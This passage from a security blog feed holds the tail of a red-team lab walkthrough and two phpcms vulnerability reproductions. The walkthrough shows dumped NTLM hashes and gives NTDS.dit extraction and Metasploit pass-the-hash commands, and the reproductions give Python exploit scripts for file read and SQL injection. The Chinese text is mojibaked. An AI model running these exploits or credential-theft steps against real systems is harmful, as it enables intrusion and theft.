 * Domain   : GOD     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     kerberos :         * Username : owa$     * Domain   : GOD.ORG     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     ssp :        credman :    ** SAM ACCOUNT **SAM Username         : krbtgtObject Security ID   : S-1-5-21-2952760202-1353902439-2381784089-502Object Relative ID   : 502Credentials:  Hash NTLM: 58e91a5ac358d86513ab224312314061Object RDN           : Read-only Domain Controllers** SAM ACCOUNT **SAM Username         : AdministratorObject Security ID   : S-1-5-21-2952760202-1353902439-2381784089-500Object Relative ID   : 500Credentials:  Hash NTLM: a45a7246dd74b64a67f22fd7020f1bd8Object RDN           : Administrators502    krbtgt    58e91a5ac358d86513ab2243123140611106    ligang    1e3d22f88dfd250c9312d21686c60f411107    DEV1$    bed18e5b9d13bb384a3041a10d43c01b1104    ROOT-TVI862UBEH$    5604267003351107febdc6ed4e2dfdce1105    STU1$    cb45e05d22e8106184056e55ac541149500    Administrator    a45a7246dd74b64a67f22fd7020f1bd81001    OWA$    f8ddc71a57488df647086512711859691108    gqy    aa3afe73b6e0c2d87b3a428bf696ae711000    liukaifeng01    a45a7246dd74b64a67f22fd7020f1bd8</code></pre><p>å¯æƒœæ²¡æœ‰æ˜æ–‡å¯†ç </p><p>åˆ©ç”¨pthç™»é™†Administrator</p><p>å…ˆå¯¼å‡ºsystem å’Œ NTDS.dit</p><pre><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q qNTDSDumpEx -d ntds.dit -s system -o domain.txtå¾—åˆ°hashAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><p>ç”¨msfä¸Šçš„<code>exploit/windows/smb/psexec</code>æ¥è¿›è¡Œpthæ”»å‡»</p><pre><code>use exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost xxxset lport xxxset rhosts 192.168.52.138set smbuser Administratorset smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><p><img src="https://i.loli.net/2020/02/17/9oLDYlWv5GBwOUN.png" alt="image12506"></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/17/vulnstackATT&CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•/">http://blog.ccreater.top/2020/02/17/vulnstackATT&amp;CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> é¶åœº </tag>
            
            <tag> åŸŸæ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–</title>
      <link href="/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-1ä»»æ„æ–‡ä»¶è¯»å–"><a href="#phpcmsv9-6-1ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–"></a>phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–</h1><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´ä½ç½®: <code>phpcms/modules/content/down.php</code> ã€‚åœ¨è¯¥æ–‡ä»¶çš„ <code>download</code> æ–¹æ³•ä¸­æœ€åä¸€è¡Œè°ƒç”¨äº† <code>file_down</code> æ–‡ä»¶ä¸‹è½½å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è¯»å–çš„æ–‡ä»¶è·¯å¾„ã€‚ </p><pre><code class="php">    public function download() {        $a_k = trim($_GET[&#39;a_k&#39;]);        $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);        $a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));        unset($i,$m,$f,$t,$ip);        parse_str($a_k);                ...        $starttime = intval($t);        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));        $fileurl = trim($f);        if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&#39;illegal_parameters&#39;));            $endtime = SYS_TIME - $starttime;        if($endtime &gt; 3600) showmessage(L(&#39;url_invalid&#39;));        if($m) $fileurl = trim($s).trim($fileurl);        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));        //è¿œç¨‹æ–‡ä»¶        if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) {             header(&quot;Location: $fileurl&quot;);        } else {            if($d == 0) {                header(&quot;Location: &quot;.$fileurl);            } else {                $fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);                $filename = basename($fileurl);                //å¤„ç†ä¸­æ–‡æ–‡ä»¶                if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {                    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));                    $filename = urldecode(basename($filename));                }                $ext = fileext($filename);                $filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;                $fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);                file_down($fileurl, $filename);            }        }    }</code></pre><p>æˆ‘ä»¬è·Ÿè¿›<code>file_down</code>:</p><pre><code class="php">function file_down($filepath, $filename = &#39;&#39;) {    if(!$filename) $filename = basename($filepath);    if(is_ie()) $filename = rawurlencode($filename);    $filetype = fileext($filename);    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));    if(ob_get_length() !== false) @ob_end_clean();    header(&#39;Pragma: public&#39;);    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);    header(&#39;Content-Transfer-Encoding: binary&#39;);    header(&#39;Content-Encoding: none&#39;);    header(&#39;Content-type: &#39;.$filetype);    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$filename.&#39;&quot;&#39;);    header(&#39;Content-length: &#39;.$filesize);    readfile($filepath);    exit;}</code></pre><p>å¯ä»¥çœ‹åˆ°ä»–ä¼šç›´æ¥è¯»å–æ–‡ä»¶ç„¶å,exit</p><p>æˆ‘ä»¬å†çœ‹ä¸‹<code>download</code>ä¸­çš„<code>$fileurl</code>çš„ç”Ÿæˆè¿‡ç¨‹:</p><pre><code class="php">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));if($m) $fileurl = trim($s).trim($fileurl);if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);$fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);</code></pre><p><code>$fileurl</code>ç”±<code>$f</code>äº§ç”Ÿçš„,å…¶ä¸­ä¸èƒ½å¸¦æœ‰phpç­‰å…³é”®å­—,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ€åä¸€è¡Œçš„str_replaceæ¥ç»•è¿‡,è€Œ<code>$f</code>ç”±<code>parse_str($a_k)</code>å¾—æ¥çš„</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾ä¸€å¤„</p><pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);</code></pre><p>ä»¥<code>$pc_auth_key</code>ä½œä¸ºå¯†é’¥çš„åŠ å¯†ç‚¹</p><p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p><p>æ˜¾ç„¶åªæœ‰ä¸­é—´çš„é‚£ä¸ªå¯ä»¥</p><pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));$downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;</code></pre><p>è€Œ<code>$i,$m,$f</code>ç­‰éƒ½æ˜¯ä»<code>parse_str($a_k);</code>è·å¾—</p><pre><code class="php">        parse_str($a_k);        if(isset($i)) $i = $id = intval($i);        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));</code></pre><p>æ¥ä¸‹æ¥å°±è·Ÿ9.6.0ç‰ˆæœ¬çš„sqlæ³¨å…¥ç›¸åŒäº†</p><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><pre><code class="python">import reimport requestsimport randomfrom urllib.parse import quotedef poc(url,proxies={}):    sess=requests.session()    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)    sess.proxies=proxies    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]    param={        &quot;m&quot;:&quot;attachment&quot;,        &quot;c&quot;:&quot;attachments&quot;,        &quot;a&quot;:&quot;swfupload_json&quot;,        &quot;src&quot;:&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot; % quote(&quot;index.p&lt;h&lt;p&amp;d=1&quot;)    }    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})    #print(sess.cookies.get_dict())    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text    #print(userid,a_k)    a_k=re.search(&#39;&#39;&#39;a_k=([^&quot;]*)&#39;&#39;&#39;,result).groups()[0]    #print(result)    #print(a_k)    res=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;%(url,a_k))    if res.status_code==200 and &quot;pc_base::creat_app();&quot; in res.text:        return True    else :        return False#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;))</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†/</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–/">http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcmsv9.6.0SQLæ³¨å…¥</title>
      <link href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0SQLæ³¨å…¥"><a href="#phpcmsv9-6-0SQLæ³¨å…¥" class="headerlink" title="phpcmsv9.6.0SQLæ³¨å…¥"></a>phpcmsv9.6.0SQLæ³¨å…¥</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ol><li>å¼€å¯wap</li><li>phpcms ç‰ˆæœ¬å°äºç­‰äº9.6.0</li></ol><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´ä¿¡æ¯:</p><blockquote><p>è¿™ä¸ªç‰ˆæœ¬çš„ <strong>SQLæ³¨å…¥</strong> ä¸»è¦åœ¨äºç¨‹åºå¯¹è§£å¯†åçš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤. æ¼æ´æ–‡ä»¶: <strong>phpcms/modules/content/down.php</strong> ã€‚åœ¨å…¶ <strong>init</strong> æ–¹æ³•ä¸­ï¼Œä» <strong>GET</strong> æ•°æ®ä¸­è·å–äº† <strong>a_k</strong> çš„å€¼ ,è§£å¯†åç›´æ¥å˜é‡è¦†ç›–,å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p></blockquote><pre><code class="php">public function init() {        $a_k = trim($_GET[&#39;a_k&#39;]);        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));        parse_str($a_k);        if(isset($i)) $i = $id = intval($i);        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));        $allow_visitor = 1;        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));            ...    }</code></pre><p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>è·Ÿè¿›å»</p><pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {        if (is_array($where)) $where = $this-&gt;sqls($where);        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);    }</code></pre><pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {        if (is_array($where)) {            $sql = &#39;&#39;;            foreach ($where as $key=&gt;$val) {                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;            }            return $sql;        } else {            return $where;        }    }</code></pre><pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;        $limit = &#39; LIMIT 1&#39;;        $field = explode( &#39;,&#39;, $data);        array_walk($field, array($this, &#39;add_special_char&#39;));        $data = implode(&#39;,&#39;, $field);        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;        $this-&gt;execute($sql);        $res = $this-&gt;fetch_next();        $this-&gt;free_result();        return $res;    }</code></pre><p>æ²¡æœ‰å¯¹è§£å¯†åçš„idè¿›è¡Œä»»ä½•è¿‡æ»¤</p><p>æ¥ç€è¦æ‰¾ä¸€ä¸ªèƒ½ç”¨ç›¸åŒå¯†é’¥åŠ å¯†çš„åœ°æ–¹,è¿™æ ·ä¾¿æ— éœ€æš´éœ²auth_keyå°±èƒ½æ‰§è¡Œæ¶æ„sqlè¯­å¥</p><p>æˆ‘ä»¬åˆ©ç”¨<code>set_cookie</code>æ¥ç”ŸæˆåŠ å¯†æ•°æ®</p><p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p><p>æŸ¥æ‰¾è°ƒç”¨<code>set_cookie</code>ä¸”å€¼<code>$value</code>å¯æ§çš„ä½ç½®</p><p><code>phpcms/modules/attachment/attachments.php</code> æ–‡ä»¶çš„ <code>swfupload_json</code> æ–¹æ³•æœ‰æ»¡è¶³æˆ‘ä»¬éœ€è¦çš„ä»£ç ã€‚(èœé¸¡ç›´æ¥çœ‹åˆ«äººæ‰¾åˆ°çš„)</p><pre><code class="php">public function swfupload_json() {        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));        $json_str = json_encode($arr);        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {            return true;        } else {            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;            param::set_cookie(&#39;att_json&#39;,$json_str);            return true;                    }    }</code></pre><p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,è·Ÿè¿›<code>safe_replace</code></p><pre><code class="php">function safe_replace($string) {    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);    return $string;}</code></pre><p>è™½ç„¶è¿™é‡Œå•å¼•å·è¢«è¿‡æ»¤äº†,ä½†æ˜¯å‰é¢æ˜¯ç”¨<code>parse_str($a_k);</code>æ¥æ¢å¤å˜é‡çš„,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>safe_replace</code>èƒ½å°†æŸäº›å­—ç¬¦æ›¿æ¢ä¸ºç©ºæ ¼ç”¨urlç¼–ç æ¥ç»•è¿‡é»‘åå•</p><p>ä½†æ˜¯åœ¨è°ƒç”¨<code>swfupload_json</code> å‰,å®ƒè¿˜ä¼šè°ƒç”¨<code>__construct</code>æ–¹æ³•</p><pre><code class="php">function __construct() {        pc_base::load_app_func(&#39;global&#39;);        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);                $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;        //åˆ¤æ–­æ˜¯å¦ç™»å½•        if(empty($this-&gt;userid)){            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));        }    }</code></pre><p>æˆ‘ä»¬éœ€è¦ç”¨<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>æ¥ç”Ÿæˆ<code>$this-&gt;userid</code>,æ¥ç»•è¿‡æ­»äº¡exit</p><p>è¿™æ¬¡æˆ‘ä»¬è¿˜éœ€è¦æ‰¾ä¸€ä¸ªåœ°æ–¹æ¥ç”Ÿæˆ<code>userid</code>,ä½†æ˜¯é™åˆ¶æ›´å°‘äº†,åªè¦<code>$this-&gt;userid</code>ä¸ä¸ºç©ºå³å¯</p><p> æˆ‘ä»¬å¯ä»¥æœåˆ° <code>phpcms/modules/wap/index.php</code> æ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­ <code>$_GET[&#39;siteid&#39;]</code> å¯æ§ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ <strong>cookie</strong> è·å¾—åŠ å¯†åçš„æ•°æ®,è™½ç„¶æœ‰intvalæ¥è¿‡æ»¤</p><pre><code class="php">function __construct() {                $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);            $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));    }</code></pre><p>äºæ˜¯æ•´ä¸ªæ”»å‡»é“¾ä¾¿å®Œæ•´äº†</p><p>å…ˆåˆ©ç”¨wapæ¥è·å¾—<code>userid</code></p><p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p><p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p><p>å†åˆ©ç”¨attachmentæ¥è·å¾—åŠ å¯†çš„æ¶æ„sqlè¯­å¥</p><pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(çœ‹pocå§)post:userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><pre><code class="python">import reimport requestsimport randomdef poc(url,proxies={}):    sess=requests.session()    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)    sess.proxies=proxies    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]    param={        &quot;m&quot;:&quot;attachment&quot;,        &quot;c&quot;:&quot;attachments&quot;,        &quot;a&quot;:&quot;swfupload_json&quot;,        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;    }    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text    #print(userid,a_k)    if &quot;XPATH syntax error&quot; in result:        return True    return 